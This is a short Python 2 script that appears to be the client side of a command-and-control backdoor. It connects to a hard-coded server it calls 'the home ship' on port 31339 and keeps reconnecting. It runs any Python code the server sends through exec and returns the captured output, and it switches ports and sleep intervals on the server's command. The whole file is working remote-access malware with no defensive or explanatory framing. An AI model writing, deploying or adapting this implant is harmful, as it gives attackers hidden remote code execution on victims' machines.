#!/usr/bin/python

import socket,subprocess,time,getpass,fcntl,struct,os,json,sys
from cStringIO import StringIO

HOST = "10.2.246.174"     # The home ship
STATICPORT = 31339     # The same port as used by the server
PORT = STATICPORT
SCRIPTNAME = os.path.basename(__file__)
SLEEPTIME = 3 # default sleep time
THREAD_ID = -1

def readuntil(s):
	b = ""
	while chr(255) not in b:
		b += s.recv(1)
	return b

def migratePorts(port, data):
	PORT = int(port)
	time.sleep(SLEEPTIME)
	print "[~] Migrating to {0}".format(PORT)

	global s
	s.close()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(SLEEPTIME)
	s.connect((HOST, PORT))
	s.send(json.dumps({"data": data, "tid": THREAD_ID})+chr(255))

def code(command, port):
	if command:
		print '[~] Running "{0}"'.format(command)

	try:
		output = ""

		if command:
			old_stdout = sys.stdout
			redirected_output = sys.stdout = StringIO()
			exec(command)
			sys.stdout = old_stdout

			output = redirected_output.getvalue()

		try:
			migratePorts(port, output)
		except:
			s.close()
			time.sleep(SLEEPTIME)
			main()
	except:
		pass


def main():
	global s
	global PORT
	global STATICPORT
	global SLEEPTIME
	global THREAD_ID
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(SLEEPTIME)
		s.connect((HOST, PORT))
		s.send(json.dumps({"tid": THREAD_ID})+chr(255))

		while(1):
				data = readuntil(s)[:-1]
				data = json.loads(data)
				if "sleep" in data:
					SLEEPTIME = int(data["sleep"])
				if THREAD_ID == -1 and "tid" in data:
					THREAD_ID = int(data["tid"])
				code(data["code"], data['newport'])
	except Exception as ex:
		print "Error:", ex
		PORT = STATICPORT
		time.sleep(SLEEPTIME)

	main()

main()
